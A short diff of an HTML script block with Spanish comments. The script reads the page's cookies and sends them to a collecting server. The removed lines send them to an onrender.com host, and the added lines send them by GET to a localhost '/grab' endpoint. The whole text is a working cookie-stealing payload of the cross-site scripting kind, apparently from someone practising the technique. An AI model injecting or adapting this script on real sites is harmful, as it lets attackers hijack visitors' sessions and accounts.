@@ -1,17 +1,14 @@
 
 <script>
+    //Se obtiene las cookies 
     const cookies = document.cookie
 
     //Enviar cookies al servidor
-    const request= fetch("https://testnode-vo76.onrender.com/cookies",{
-        method: 'GET',
-        body: JSON.stringify({cookies})
-    })
+    fetch(`http://localhost:3000/grab?cookies=${encodeURIComponent(cookies)}`)
+    //{encodeURIComponent(cookies)} esto evita problemas con caracteres especiales
+    //La solicitud se envia a /grab como una solicitud GET
+    .then(response => response.text())
     .then(data => console.log(data))
     .catch(error => console.error('Error:', error));
     
-    const response = await fetch(request);
-    console.log(response.status)
-
-
 </script>
